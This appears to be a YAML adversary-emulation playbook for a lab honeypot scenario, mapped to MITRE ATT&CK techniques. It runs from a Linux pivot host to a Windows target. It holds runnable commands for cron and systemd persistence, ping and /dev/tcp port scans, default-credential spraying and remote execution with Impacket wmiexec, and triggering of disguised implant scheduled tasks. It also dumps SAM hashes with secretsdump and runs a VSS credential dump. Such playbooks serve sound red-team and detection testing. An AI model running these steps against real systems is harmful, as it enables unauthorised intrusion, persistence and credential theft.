name: Full Attack Scenario — Honeypot to Windows Credential Access
description: Complete Phase A+B — runs on linux_pivot session
tags:
  - linux
  - windows
  - wmiexec
  - lateral-movement
  - phase-a
  - phase-b
mitre_tactics:
  - discovery
  - persistence
  - lateral-movement
  - execution
  - credential-access
steps:
  - id: linux_sysinfo
    name: Linux host discovery (T1082)
    action:
      type: atomic
      atomic_ref:
        id: T1082
        test: 2
    output_var: linux_sysinfo_out
    timeout: 30s
    on_fail: continue
  - id: linux_network
    name: Linux network discovery (T1016)
    depends_on:
      - linux_sysinfo
    action:
      type: atomic
      atomic_ref:
        id: T1016
        test: 2
    output_var: linux_network_out
    timeout: 30s
    on_fail: continue
  - id: T1016_2_mrxv767j_2
    name: T1016 — System Network Configuration Discovery
    depends_on:
      - linux_network
    action:
      type: atomic
      atomic_ref:
        id: T1016
        test: 2
    on_fail: continue
  - id: cron_persistence
    name: Cron persistence (T1053.003)
    depends_on:
      - T1016_2_mrxv767j_2
    action:
      type: atomic
      atomic_ref:
        id: T1053.003
        test: 2
    timeout: 30s
    on_fail: continue
  - id: systemd_persistence
    name: Systemd persistence (T1543.002)
    depends_on:
      - cron_persistence
    action:
      type: atomic
      atomic_ref:
        id: T1543.002
        test: 0
    timeout: 30s
    on_fail: continue
  - id: ping_sweep
    name: Parallel ping sweep
    depends_on:
      - systemd_persistence
    action:
      type: command
      command:
        interpreter: bash
        cmd: for i in {1..254}; do (ping -c1 -W1 172.16.1.$i | grep "bytes from" &); done; wait
    output_var: alive_hosts
    on_fail: continue
  - id: reliable_scan
    name: Scan SMB, SSH, WinRM (2s timeout)
    depends_on:
      - ping_sweep
    action:
      type: command
      command:
        interpreter: bash
        cmd: |
          TARGET=172.16.1.20
          for port in 22 445 5985 5986; do
            if timeout 2 bash -c "echo >/dev/tcp/$TARGET/$port" 2>/dev/null; then
              echo "OPEN:   $TARGET:$port"
            else
              echo "CLOSED: $TARGET:$port"
            fi
          done
    output_var: service_status
    on_fail: continue
  - id: test_defaults
    name: Test multiple default credentials
    depends_on:
      - reliable_scan
    action:
      type: command
      command:
        interpreter: bash
        cmd: |
          for cred in "vagrant:vagrant" "Administrator:vagrant" "Administrator:password" "Administrator:admin"; do
            if python3 /usr/share/doc/python3-impacket/examples/wmiexec.py "$cred"@172.16.1.20 "hostname" 2>/dev/null | grep -qi "DESKTOP"; then
              echo "VALID: $cred"
              break
            fi
          done
    output_var: valid_cred
    on_fail: continue
  - id: lateral_recon
    name: Lateral movement — wmiexec hostname (T1021)
    depends_on:
      - test_defaults
    action:
      type: command
      command:
        interpreter: bash
        cmd: |
          WIN_IP="{{win_ip}}"
          if [ -z "$WIN_IP" ]; then WIN_IP="172.16.1.20"; fi
          echo "[*] LATERAL MOVEMENT INITIATED"
          echo "[*] Attack vector: Impacket WMIExec (T1021.006)"
          echo "[*] Source: linux_pivot ($(hostname))"
          echo "[*] Target: $WIN_IP (Windows SMB/WMI)"
          echo "[*] Credentials: vagrant:vagrant (T1078 - Valid Accounts)"
          echo "---"
          python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
            "vagrant:vagrant@$WIN_IP" hostname 2>&1 \
            | grep -v "^\[" | grep -v "^Impacket" | grep -v "^$" | head -5
          echo "---"
          echo "[+] LATERAL_MOVEMENT_SUCCESS: Achieved code execution on Windows host via WMI"
    output_var: win_hostname
    timeout: 120s
    on_fail: continue
  - id: win_sysinfo
    name: Windows sysinfo via wmiexec (T1082)
    depends_on:
      - lateral_recon
    action:
      type: command
      command:
        interpreter: bash
        cmd: |
          python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
            'vagrant:vagrant@172.16.1.20' "hostname" 2>&1 \
            | grep -v "^\[" | grep -v "^Impacket" | grep -v "^$" | head -2
    output_var: win_sysinfo_out
    timeout: 120s
    on_fail: continue
  - id: deploy_implant
    name: Deploy Windows implant via wmiexec (scheduled task trigger)
    depends_on:
      - win_sysinfo
    action:
      type: command
      command:
        interpreter: bash
        cmd: |
          # Trigger existing WindowsUpdateHelper scheduled task (already installed, fast)
          # Kill existing implants first (prevent duplicates):
          python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
            'vagrant:vagrant@172.16.1.20' \
            "taskkill /f /im svc*.exe /t" \
            2>&1 | tail -1 || true
          # Deploy fresh implant:
          python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
            'vagrant:vagrant@172.16.1.20' \
            "schtasks /run /tn WindowsUpdateHelper" \
            2>&1 | grep -v "^\[" | grep -v "^Impacket" | grep -v "^$" | head -3
    output_var: implant_out
    timeout: 90s
    on_fail: continue
  - id: sam_dump
    name: SAM registry dump via wmiexec (T1003.002)
    depends_on:
      - deploy_implant
    action:
      type: command
      command:
        interpreter: bash
        cmd: |
          # Trigger SAMDump scheduled task (fast, <2s, non-blocking):
          python3 /usr/share/doc/python3-impacket/examples/secretsdump.py 'vagrant:vagrant@172.16.1.20'
    output_var: sam_dump_out
    timeout: 120s
    on_fail: continue_no_err
  - id: find_dc_candidate
    name: Scan for AD/DC host — Kerberos(88) LDAP(389) SMB(445) (T1046)
    depends_on:
      - sam_dump
    action:
      type: command
      command:
        interpreter: bash
        cmd: |
          echo "=== Scanning for DC candidate ==="
          for ip in 172.16.1.1 172.16.1.5 172.16.1.20 172.16.1.100; do
            for port in 88 389 445 3268; do
              timeout 1 bash -c "echo > /dev/tcp/$ip/$port" 2>/dev/null \
                && echo "DC_CANDIDATE: $ip port:$port OPEN"
            done
          done
          exit 0
    output_var: dc_scan_out
    timeout: 30s
    on_fail: continue_no_err
  - id: shadow_copy_vss
    name: VSS shadow copy creation — credential access POC (T1003.003)
    depends_on:
      - find_dc_candidate
    action:
      type: command
      command:
        interpreter: bash
        cmd: |
          # Trigger VSSDump scheduled task (fast, non-blocking, no timeout):
          python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
            'vagrant:vagrant@172.16.1.20' \
            "schtasks /run /tn VSSDump" \
            2>&1 | grep -v "^\[" | grep -v "^Impacket" | grep -v "^$" | head -3
          echo "VSS_POC_COMPLETE"
    output_var: vss_out
    timeout: 60s
    on_fail: continue_no_err
